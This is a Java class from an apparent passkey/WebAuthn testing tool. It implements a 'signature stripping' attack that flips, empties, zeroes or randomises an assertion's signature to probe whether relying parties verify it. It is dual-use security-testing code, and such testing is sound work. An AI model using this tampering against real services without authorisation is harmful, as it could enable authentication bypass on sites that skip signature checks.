package com.anvil.passkeyeditor.attacks;

import com.anvil.passkeyeditor.model.CeremonyModel;
import com.anvil.passkeyeditor.model.CeremonyType;

import java.security.SecureRandom;

/**
 * Attack #2 - signature stripping / invalidation (no crypto, no re-sign).
 *
 * Degrades an assertion's signature to probe relying parties that fail to verify it. The floor
 * attack: the cleanest oracle and the only one that needs no prior key-substituted registration. Applies
 * to {@link com.anvil.passkeyeditor.model.CeremonyType#GET} ceremonies (mutates
 * {@link CeremonyModel#signature()}); a no-op on CREATE (a registration has no detached signature).
 *
 * Mode matters. An ES256 assertion signature is ASN.1 DER; an RP decodes it
 * before verifying. {@link Mode#EMPTY}/{@link Mode#ZEROED}/{@link Mode#GARBAGE} are not valid DER,
 * so a real RP throws on decode ("Input buffer has zero length" / parse error) rather than returning a
 * clean "signature invalid" - which is a different signal (input validation), and which an RP that
 * bypasses only signature verification (not the parse) cannot turn into an accept. {@link Mode#FLIP}
 * keeps the signature well-formed (same length, DER framing intact) but cryptographically wrong, so every
 * RP decodes it and returns {@code verified:false} - the precise "does this RP verify the
 * signature?" probe, and the right default for an oracle that rejects on a real verifier and accepts only
 * when the signature check is bypassed.
 */
public final class SigStripAttack implements AttackAction {

    /** How the signature is degraded. */
    public enum Mode {
        /**
         * Flip the trailing byte of the real signature: same length, still structurally valid (the DER
         * framing / leading sign byte are untouched), but cryptographically invalid. The cleanest
         * "does the RP verify?" probe - a parse-then-verify RP returns {@code verified:false} on every
         * algorithm WITHOUT throwing. The default.
         */
        FLIP,
        /**
         * Zero-length signature. Aggressive: probes whether the RP requires a signature at all, but a
         * parse-then-verify RP (e.g. ES256 DER decode) THROWS on it rather than returning false.
         */
        EMPTY,
        /**
         * All-zero bytes, original length preserved. Not valid DER for the ECDSA algs, so those RPs
         * throw on decode; the raw-signature algs (EdDSA, RSA) just fail verification.
         */
        ZEROED,
        /**
         * Random bytes, original length preserved. Not valid DER for the ECDSA algs, so those RPs
         * throw on decode; the raw-signature algs (EdDSA, RSA) just fail verification.
         */
        GARBAGE
    }

    private static final SecureRandom RANDOM = new SecureRandom();

    private final Mode mode;

    public SigStripAttack() {
        this(Mode.FLIP);
    }

    public SigStripAttack(Mode mode) {
        this.mode = mode;
    }

    public Mode mode() {
        return mode;
    }

    @Override
    public String name() {
        return "Strip signature";
    }

    /**
     * Degrade the assertion signature in place per {@link #mode}. A no-op when the ceremony is not a
     * GET or carries no signature (e.g. a CREATE) - CREATE has no detached signature to strip.
     */
    @Override
    public void apply(CeremonyModel model) {
        if (model == null || model.type() != CeremonyType.GET) {
            return; // CREATE / unknown: no detached signature to strip
        }
        byte[] original = model.signature();
        if (original == null) {
            return;
        }
        switch (mode) {
            case FLIP -> {
                if (original.length == 0) {
                    model.setSignature(new byte[]{0x01}); // nothing to flip; emit a non-empty sentinel
                } else {
                    byte[] flipped = original.clone();
                    flipped[flipped.length - 1] ^= (byte) 0xFF; // invalidate the trailing value byte
                    model.setSignature(flipped);
                }
            }
            case EMPTY -> model.setSignature(new byte[0]);
            case ZEROED -> model.setSignature(new byte[original.length]);
            case GARBAGE -> {
                byte[] garbage = new byte[original.length];
                RANDOM.nextBytes(garbage);
                model.setSignature(garbage);
            }
        }
    }
}
